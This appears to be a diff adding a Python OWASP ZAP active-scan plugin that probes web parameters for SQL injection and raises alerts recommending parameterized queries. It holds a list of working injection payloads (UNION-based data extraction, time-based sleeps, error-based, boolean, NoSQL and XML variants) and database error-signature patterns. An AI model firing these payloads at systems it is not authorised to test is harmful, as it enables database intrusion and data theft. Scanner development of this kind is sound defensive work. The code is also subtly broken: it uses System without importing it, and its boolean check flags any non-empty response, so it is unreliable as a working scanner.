@@ -1,0 +1,214 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+"""
+SQL Injection Scanner - ZAP Active Scan Script
+Scans for SQL injection vulnerabilities with various payloads
+"""
+
+import re
+from org.zaproxy.zap.extension.pscan import PluginPassiveScanner
+from org.zaproxy.zap.extension.ascan import AbstractAppPlugin
+from org.parosproxy.paros.core.scanner import Alert, Plugin
+
+class SQLInjectionScanner(AbstractAppPlugin):
+    
+    def __init__(self):
+        super(SQLInjectionScanner, self).__init__()
+        self.id = 90001
+        self.name = "Custom SQL Injection Scanner"
+        self.description = "Scans for SQL injection vulnerabilities"
+        
+    def getId(self):
+        return self.id
+    
+    def getName(self):
+        return self.name
+    
+    def getDescription(self):
+        return self.description
+    
+    def getCategory(self):
+        return Plugin.Category.INJECTION
+    
+    def getRisk(self):
+        return Alert.RISK_HIGH
+    
+    def getConfidence(self):
+        return Alert.CONFIDENCE_MEDIUM
+    
+    def init(self):
+        # SQL injection payloads
+        self.payloads = [
+            # Basic SQL injection
+            "' OR '1'='1",
+            "' OR 1=1--",
+            "' OR 1=1#",
+            "' OR 1=1/*",
+            "\" OR \"1\"=\"1",
+            "\" OR 1=1--",
+            "\" OR 1=1#",
+            
+            # Union-based payloads
+            "' UNION SELECT NULL--",
+            "' UNION SELECT 1,2,3--",
+            "' UNION SELECT user(),version(),database()--",
+            
+            # Time-based payloads
+            "'; WAITFOR DELAY '00:00:05'--",
+            "'; SELECT pg_sleep(5)--",
+            "'; SELECT SLEEP(5)--",
+            
+            # Error-based payloads
+            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+            "' AND extractvalue(1,concat(0x7e,version(),0x7e))--",
+            
+            # Boolean-based payloads
+            "' AND 1=1--",
+            "' AND 1=2--",
+            "' AND substring(@@version,1,1)='5'--",
+            
+            # NoSQL injection
+            "' || '1'=='1",
+            "' || true--",
+            "' || this.password.match(/.*/)//",
+            
+            # XML injection
+            "' OR xmlexists('/users/user[loginID/text()=\"admin\" and password/text()=\"password\"]' PASSING BY REF XMLPARSE(DOCUMENT '<?xml version=\"1.0\" encoding=\"UTF-8\"?><users><user><loginID>admin</loginID><password>password</password></user></users>'))--"
+        ]
+        
+        # Error patterns that indicate SQL injection
+        self.error_patterns = [
+            r"ORA-[0-9]{5}",
+            r"Microsoft.*ODBC.*SQL Server",
+            r"mysql_fetch_array\(\)",
+            r"PostgreSQL.*ERROR",
+            r"Warning.*mysql_.*",
+            r"valid MySQL result",
+            r"MySqlClient\.",
+            r"Microsoft JET Database Engine",
+            r"Access Database Engine",
+            r"SQLite.*error",
+            r"sqlite3.OperationalError",
+            r"Microsoft SQL Native Client",
+            r"SQL Server.*Driver",
+            r"Warning.*pg_.*",
+            r"valid PostgreSQL result",
+            r"Npgsql\.",
+            r"Oracle error",
+            r"Oracle.*Driver",
+            r"OracleClient\.",
+            r"Microsoft Access Driver",
+            r"OLE DB.*SQL Server",
+            r"Unclosed quotation mark",
+            r"Incorrect syntax near",
+            r"Syntax error.*query expression",
+            r"Data type mismatch",
+            r"Microsoft OLE DB Provider for Oracle",
+            r"java\.sql\.SQLException",
+            r"java\.sql\.SQLSyntaxErrorException",
+            r"com\.mysql\.jdbc\.exceptions"
+        ]
+        
+        # Time-based detection threshold (seconds)
+        self.time_threshold = 4.0
+    
+    def scan(self, msg, param, value):
+        """Main scanning method"""
+        base_msg = msg
+        
+        # Test each payload
+        for payload in self.payloads:
+            # Create test message
+            test_msg = base_msg.cloneRequest()
+            
+            # Set the payload
+            self.setParameter(test_msg, param, payload)
+            
+            # Send request and analyze response
+            try:
+                start_time = System.currentTimeMillis()
+                self.sendAndReceive(test_msg)
+                end_time = System.currentTimeMillis()
+                
+                response_time = (end_time - start_time) / 1000.0
+                response_body = test_msg.getResponseBody().toString()
+                
+                # Check for SQL injection indicators
+                if self._check_sql_injection(response_body, response_time, payload):
+                    self._create_alert(test_msg, param, payload, response_body)
+                    return
+                    
+            except Exception as e:
+                print("Error testing payload: " + str(e))
+                continue
+    
+    def _check_sql_injection(self, response_body, response_time, payload):
+        """Check if response indicates SQL injection"""
+        
+        # Check for database error messages
+        for pattern in self.error_patterns:
+            if re.search(pattern, response_body, re.IGNORECASE):
+                return True
+        
+        # Check for time-based SQL injection
+        if any(keyword in payload.lower() for keyword in ['sleep', 'waitfor', 'pg_sleep']):
+            if response_time > self.time_threshold:
+                return True
+        
+        # Check for boolean-based indicators
+        if "' AND 1=1--" in payload or "' AND 1=2--" in payload:
+            # This would require comparison with baseline response
+            # Simplified check for demonstration
+            if len(response_body) > 0:
+                return True
+        
+        # Check for union-based indicators
+        if "union select" in payload.lower():
+            # Look for column count errors or successful unions
+            union_patterns = [
+                r"The used SELECT statements have a different number of columns",
+                r"SELECTs to the left and right of UNION do not have the same number of result columns",
+                r"ORA-01789",
+                r"All queries combined using a UNION"
+            ]
+            
+            for pattern in union_patterns:
+                if re.search(pattern, response_body, re.IGNORECASE):
+                    return True
+        
+        return False
+    
+    def _create_alert(self, msg, param, payload, response_body):
+        """Create security alert"""
+        alert = Alert(
+            self.getId(),
+            Alert.RISK_HIGH,
+            Alert.CONFIDENCE_MEDIUM,
+            self.getName()
+        )
+        
+        alert.setDescription("SQL Injection vulnerability detected")
+        alert.setUri(msg.getRequestHeader().getURI().toString())
+        alert.setParam(param)
+        alert.setAttack(payload)
+        alert.setOtherInfo("Parameter: " + param + " | Payload: " + payload)
+        alert.setMessage(msg)
+        
+        # Set solution
+        alert.setSolution("Use parameterized queries/prepared statements. Validate and sanitize all user inputs.")
+        
+        # Set reference
+        alert.setReference("https://owasp.org/www-community/attacks/SQL_Injection")
+        
+        # Raise the alert
+        self.raiseAlert(alert)
+
+# Register the scanner
+def register_scanner():
+    scanner = SQLInjectionScanner()
+    return scanner
+
+# For ZAP script console
+if __name__ == "__main__":
+    scanner = register_scanner()
+    print("SQL Injection Scanner loaded successfully!")
